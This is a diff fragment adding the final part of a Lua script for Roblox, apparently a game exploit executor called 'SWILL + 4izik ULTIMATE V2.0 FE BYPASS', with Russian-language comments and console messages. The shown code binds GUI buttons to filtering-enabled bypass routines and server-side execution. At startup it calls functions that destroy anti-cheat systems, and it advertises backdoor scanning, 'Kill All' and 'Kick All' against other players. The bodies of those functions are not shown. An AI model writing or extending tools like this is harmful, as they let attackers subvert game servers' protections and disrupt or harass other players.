+    buttonList[13].MouseButton1Click:Connect(function() SWILL.Execute() end)
+    buttonList[14].MouseButton1Click:Connect(function() SWILL.Clear() end)
+    buttonList[15].MouseButton1Click:Connect(function() SWILL.ShowStatus() end)
+
+    -- НАЗНАЧЕНИЕ НОВЫХ КНОПОК FE BYPASS
+    feButtonList[1].MouseButton1Click:Connect(function() SWILL.FEBypassV1() end)
+    feButtonList[2].MouseButton1Click:Connect(function() SWILL.FEBypassV2() end)
+    feButtonList[3].MouseButton1Click:Connect(function() SWILL.FEBypassV3() end)
+    feButtonList[4].MouseButton1Click:Connect(function() SWILL.UltraFEBypass() end)
+    feButtonList[5].MouseButton1Click:Connect(function() SWILL.ClientSideExecute() end)
+    feButtonList[6].MouseButton1Click:Connect(function() SWILL.ServerSideExecute() end)
+    feButtonList[7].MouseButton1Click:Connect(function() SWILL.ModuleSideExecute() end)
+
+    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+    UserInputService.InputBegan:Connect(function(input, processed)
+        if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then mainFrame.Visible = not mainFrame.Visible end
+    end)
+
+    local dragToggle, dragInput, dragStart, startPos = false
+    mainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:GetFocusedTextBox() == nil then
+            dragToggle = true; dragStart = input.Position; startPos = mainFrame.Position
+            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragToggle = false end end)
+        end
+    end)
+    mainFrame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragToggle then
+            local delta = input.Position - dragStart
+            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    spawn(function()
+        while screenGui and screenGui.Parent do wait(5) updateStatus() end
+    end)
+
+    print("[4izik] V2.0 активирован | Все функции через бэкдор")
+    print("[SWILL] FE BYPASS методы: V1, V2, V3, ULTRA, CLIENT-SIDE, SERVER-SIDE, MODULE-SIDE")
+end
+
+local function start()
+    print("═══════════════════════════════════════════════════════════════════")
+    print("SWILL + 4izik ULTIMATE V2.0 | FE BYPASS EXECUTOR")
+    print("ФУНКЦИИ: Kill All | Kick All | Sparkle All | Fire All | Smoke All")
+    print("НОВЫЕ: SS Polaria | HD Ranker | HappyHub SS | c00lgui | Repobiloraia")
+    print("FE BYPASS: V1 | V2 | V3 | ULTRA | CLIENT-SIDE | SERVER-SIDE | MODULE-SIDE")
+    print("═══════════════════════════════════════════════════════════════════")
+    print("[4izik] ВНИМАНИЕ: Автоматический поиск ОТКЛЮЧЕН")
+    print("[4izik] Сначала нажмите FIND BACKDOOR, затем используйте функции")
+    print("[SWILL] ULTRA FE BYPASS активирован по умолчанию")
+    print("═══════════════════════════════════════════════════════════════════")
+
+    pcall(anti267)
+    pcall(destroyAntiCheats)
+    pcall(UltraFEBypass)
+    pcall(createGUI)
+
+    print("[4izik] Anti-267: АКТИВЕН")
+    print("[4izik] Anti-Anticheat: АКТИВЕН")
+    print("[4izik] Remote Scanner: АКТИВЕН")
+    print("[SWILL] FE BYPASS ULTRA: АКТИВЕН")
+    print("═══════════════════════════════════════════════════════════════════")
+    print("[4izik] Alt - скрыть/показать окно")
+    print("[4izik] FIND BACKDOOR - поиск бэкдора")
+    print("[4izik] После нахождения - все функции через бэкдор")
+    print("[SWILL] FE BYPASS кнопки в нижней части GUI")
+    print("═══════════════════════════════════════════════════════════════════")
+end
+
+start()
+
+return SWILL
